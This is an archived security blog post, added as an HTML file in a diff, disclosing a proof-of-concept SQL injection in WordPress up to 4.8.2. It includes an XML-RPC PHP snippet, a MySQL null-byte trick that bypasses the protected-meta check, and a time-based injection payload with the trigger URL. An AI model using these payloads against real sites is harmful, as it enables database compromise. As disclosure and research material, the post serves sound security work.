@@ -1,0 +1,253 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>Wordpress &lt;= 4.8.2 SQL Injection POC | Vulspy Blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="Author: Ambulong@vulspy I found this vulnerability after reading slavco’s post, and reported it to Wordpress Team via Hackerone on Sep. 2nd, 2017. But, unfortunately, WordPress team didn’t pay attenti">
+<meta name="keywords" content="漏洞分析">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Wordpress &lt;= 4.8.2 SQL Injection POC">
+<meta property="og:url" content="http://blog.vulspy.com/2017/11/09/Wordpress-4-8-2-SQL-Injection-POC/index.html">
+<meta property="og:site_name" content="Vulspy Blog">
+<meta property="og:description" content="Author: Ambulong@vulspy I found this vulnerability after reading slavco’s post, and reported it to Wordpress Team via Hackerone on Sep. 2nd, 2017. But, unfortunately, WordPress team didn’t pay attenti">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2017-11-11T02:09:25.111Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Wordpress &lt;= 4.8.2 SQL Injection POC">
+<meta name="twitter:description" content="Author: Ambulong@vulspy I found this vulnerability after reading slavco’s post, and reported it to Wordpress Team via Hackerone on Sep. 2nd, 2017. But, unfortunately, WordPress team didn’t pay attenti">
+  
+    <link rel="alternate" href="/atom.xml" title="Vulspy Blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  
+
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-108901411-1"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'UA-108901411-1');
+  </script>
+
+</head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Vulspy Blog</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Vulspy Blog</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="搜索"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://blog.vulspy.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-Wordpress-4-8-2-SQL-Injection-POC" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2017/11/09/Wordpress-4-8-2-SQL-Injection-POC/" class="article-date">
+  <time datetime="2017-11-09T11:13:04.000Z" itemprop="datePublished">2017-11-09</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      Wordpress &lt;= 4.8.2 SQL Injection POC
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>Author: Ambulong@vulspy</p>
+<p>I found this vulnerability after reading <a href="https://medium.com/websec/wordpress-sqli-bbb2afcc8e94" target="_blank" rel="external">slavco’s post</a>, and reported it to Wordpress Team via Hackerone on Sep. 2nd, 2017. But, unfortunately, WordPress team didn’t pay attention to this report too.</p>
+<h2 id="SQL-Injection-Details"><a href="#SQL-Injection-Details" class="headerlink" title="# SQL Injection Details"></a># SQL Injection Details</h2><ul>
+<li><a href="https://medium.com/websec/wordpress-sqli-bbb2afcc8e94" target="_blank" rel="external">Wordpress SQLi by slavco</a></li>
+<li><a href="https://medium.com/websec/wordpress-sqli-poc-f1827c20bf8e" target="_blank" rel="external">Wordpress SQLi — PoC by slavco</a></li>
+<li><a href="https://medium.com/websec/wordpress-sqli-how-to-find-ebee713457e4" target="_blank" rel="external">Wordpress SQLi — how to find by slavco</a></li>
+<li><a href="https://blog.ircmaxell.com/2017/10/disclosure-wordpress-wpdb-sql-injection-technical.html" target="_blank" rel="external">Disclosure: WordPress WPDB SQL Injection - Technical by ircmaxell</a></li>
+</ul>
+<h2 id="POC-Details"><a href="#POC-Details" class="headerlink" title="# POC Details"></a># POC Details</h2><p>If you already found out the potential sqli in wordpress, you would know that we need to insert our playload into <code>_thumbnail_id</code> meta in order to launch the sqli attack.</p>
+<h3 id="Wordpress-≤-4-7-4-Lack-of-capability-checks-for-post-meta-data-in-the-XML-RPC-API"><a href="#Wordpress-≤-4-7-4-Lack-of-capability-checks-for-post-meta-data-in-the-XML-RPC-API" class="headerlink" title="## Wordpress ≤ 4.7.4 Lack of capability checks for post meta data in the XML-RPC API"></a>## Wordpress ≤ 4.7.4 Lack of capability checks for post meta data in the XML-RPC API</h3><p>This vulnerability have mentioned in slavco’s post: <a href="https://medium.com/websec/wordpress-sqli-bbb2afcc8e94" target="_blank" rel="external">Wordpress SQLi</a></p>
+<p>Reference: <a href="https://wordpress.org/news/2017/05/wordpress-4-7-5/" target="_blank" rel="external">WordPress 4.7.5 Security and Maintenance Release</a></p>
+<p><strong>POC</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">$usr = <span class="string">'author'</span>;</div><div class="line">$pwd = <span class="string">'author'</span>;</div><div class="line">$xmlrpc = <span class="string">'http://local.target/xmlrpc.php'</span>;</div><div class="line">$client = <span class="keyword">new</span> IXR_Client($xmlrpc);</div><div class="line">$content = <span class="keyword">array</span>(<span class="string">"ID"</span> =&gt; <span class="number">6</span>, <span class="string">'meta_input'</span> =&gt; <span class="keyword">array</span>(<span class="string">"_thumbnail_id"</span>=&gt;<span class="string">"xxx"</span>));</div><div class="line">$res = $client-&gt;query(<span class="string">'wp.editPost'</span>,<span class="number">0</span>, $usr, $pwd, <span class="number">6</span><span class="comment">/*post_id*/</span>, $content);</div></pre></td></tr></table></figure>
+<h3 id="Wordpress-≤-4-8-2-POST-Meta-Protection-Bypass"><a href="#Wordpress-≤-4-8-2-POST-Meta-Protection-Bypass" class="headerlink" title="## Wordpress ≤ 4.8.2 POST Meta Protection Bypass"></a>## Wordpress ≤ 4.8.2 POST Meta Protection Bypass</h3><h4 id="A-trick-of-Mysql"><a href="#A-trick-of-Mysql" class="headerlink" title="A trick of Mysql"></a>A trick of Mysql</h4><p>1). A normal query for _thumbnail_id</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">mysql&gt; SELECT * FROM wp_postmeta WHERE meta_key = &apos;_thumbnail_id&apos;;</div><div class="line">+---------+---------+----------------+------------+</div><div class="line">| meta_id | post_id | meta_key       | meta_value |</div><div class="line">+---------+---------+----------------+------------+</div><div class="line">|       4 |       4 | _thumbnail_id  | TESTC      |</div><div class="line">+---------+---------+----------------+------------+</div><div class="line">1 row in set (0.00 sec)</div></pre></td></tr></table></figure>
+<p>2). Change the meta_value of _thumbnail_id to “\x00_thumbnail_id”</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">mysql&gt; update wp_postmeta set meta_key = concat(0x00,&apos;TESTC&apos;) where meta_value = &apos;_thumbnail_id&apos;;</div><div class="line">Query OK, 0 rows affected (0.00 sec)</div><div class="line">Rows matched: 0  Changed: 0  Warnings: 0</div></pre></td></tr></table></figure>
+<p>3). Query by _thumbnail_id again</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">mysql&gt; SELECT * FROM wp_postmeta WHERE meta_key = &apos;_thumbnail_id&apos;;</div><div class="line">+---------+---------+----------------+------------+</div><div class="line">| meta_id | post_id | meta_key       | meta_value |</div><div class="line">+---------+---------+----------------+------------+</div><div class="line">|       4 |       4 |  _thumbnail_id | TESTC      |</div><div class="line">+---------+---------+----------------+------------+</div><div class="line">1 row in set (0.00 sec)</div></pre></td></tr></table></figure>
+<h4 id="POST-Meta-Protection-Bypass"><a href="#POST-Meta-Protection-Bypass" class="headerlink" title="POST Meta Protection Bypass"></a>POST Meta Protection Bypass</h4><p>This is the <code>is_protected_meta</code>(<a href="https://github.com/WordPress/WordPress/blob/bbb8d48086b7d10908f4fda673585ee122f2851d/wp-includes/meta.php#L920" target="_blank" rel="external">./wp-includes/meta.php</a>) method used to check the validation of post meta:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_protected_meta</span><span class="params">( $meta_key, $meta_type = null )</span> </span>&#123;</div><div class="line">    $protected = ( <span class="string">'_'</span> == $meta_key[<span class="number">0</span>] );</div><div class="line">    <span class="comment">/**</span></div><div class="line"><span class="comment">     * Filters whether a meta key is protected.</span></div><div class="line"><span class="comment">     *</span></div><div class="line"><span class="comment">     * [<span class="doctag">@since</span>](/since) 3.2.0</span></div><div class="line"><span class="comment">     *</span></div><div class="line"><span class="comment">     * [<span class="doctag">@param</span>](/param) bool   $protected Whether the key is protected. Default false.</span></div><div class="line"><span class="comment">     * [<span class="doctag">@param</span>](/param) string $meta_key  Meta key.</span></div><div class="line"><span class="comment">     * [<span class="doctag">@param</span>](/param) string $meta_type Meta type.</span></div><div class="line"><span class="comment">     */</span></div><div class="line">    <span class="keyword">return</span> apply_filters( <span class="string">'is_protected_meta'</span>, $protected, $meta_key, $meta_type );</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>The code just checks the first character of <code>$meta_key</code>, from the mysql trick, we can use <code>%00_</code> to bypass it.</p>
+<p><strong>POC</strong></p>
+<ol>
+<li>Add New Custom Field, Name:<code>_thumbnail_id</code> Value:<code>55 %1$%s or sleep(10)#</code></li>
+<li>Click <code>Add Custom Field</code> button.</li>
+<li>Modify the HTTP request, <code>_thumbnail_id</code> =&gt; <code>%00_thumbnail_id</code></li>
+<li>Launch the attack. Visit <code>/wp-admin/edit.php?action=delete&amp;_wpnonce=xxx&amp;ids=55 %1$%s or sleep(10)#</code>.</li>
+</ol>
+<h4 id="Time-line"><a href="#Time-line" class="headerlink" title="Time-line:"></a>Time-line:</h4><ul>
+<li>Sep. 2th - I report the vulnerability to WP Team via Hackerone.</li>
+<li>Sep. 6th - WP Team ask for details.</li>
+<li>Sep. 6th - I post the details.</li>
+<li>Sep. 6th to now - I haven’t received any response yet…</li>
+</ul>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://blog.vulspy.com/2017/11/09/Wordpress-4-8-2-SQL-Injection-POC/" data-id="cj9y5qhhr0009lqpvklx3pork" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞分析/">漏洞分析</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2017/09/05/Wordpress-POST-META-Check-Bypass/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">Wordpress POST META_NAME校验绕过</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">标签</h3>
+    <div class="widget">
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/渗透测试/">渗透测试</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/漏洞分析/">漏洞分析</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">归档</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/11/">十一月 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/09/">九月 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/08/">八月 2017</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">最新文章</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2017/11/09/Wordpress-4-8-2-SQL-Injection-POC/">Wordpress &lt;= 4.8.2 SQL Injection POC</a>
+          </li>
+        
+          <li>
+            <a href="/2017/09/05/Wordpress-POST-META-Check-Bypass/">Wordpress POST META_NAME校验绕过</a>
+          </li>
+        
+          <li>
+            <a href="/2017/09/03/Wordpress-SQL-Injection-Analysis-2/">Wordpress SQL注入分析（二）</a>
+          </li>
+        
+          <li>
+            <a href="/2017/09/02/Wordpress-SQL-Injection-Analysis-1/">Wordpress SQL注入分析（一）</a>
+          </li>
+        
+          <li>
+            <a href="/2017/08/12/SSRF-And-URL-Related-TIPS/">SSRF And URL Related TIPS</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2017 <a href="mailto:zeng.ambulong@gmail.com">Ambulong</a><br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Vulspy Blog</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+  </div>
+</body>
+</html>
